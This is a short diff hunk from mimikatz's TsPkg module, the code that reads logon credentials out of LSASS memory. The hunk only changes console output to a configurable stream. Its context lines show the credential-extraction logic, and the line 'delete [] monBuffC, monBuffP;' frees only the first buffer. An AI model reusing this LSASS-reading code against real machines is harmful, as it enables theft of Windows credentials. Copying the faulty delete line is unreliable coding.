@@ -82,12 +82,12 @@ bool WINAPI mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData(__in PLUID logId, __i
 					if(mod_memory::readMemory(pLogSession->pTsPrimary, monBuffC, sizeof(KIWI_TS_PRIMARY_CREDENTIAL), mod_mimikatz_sekurlsa::hLSASS))
 						mesCreds = &(reinterpret_cast<PKIWI_TS_PRIMARY_CREDENTIAL>(monBuffC)->credentials);
 				}
-				else wcout << L"n.s. (SuppCred KO) / ";
+				else (*outputStream) << L"n.s. (SuppCred KO) / ";
 			}
 		}
 		mod_mimikatz_sekurlsa::genericCredsToStream(mesCreds, justSecurity, true);
 		delete [] monBuffC, monBuffP;
 	}
-	else wcout << L"n.a. (tspkg KO)";
+	else (*outputStream) << L"n.a. (tspkg KO)";
 	return true;
 }
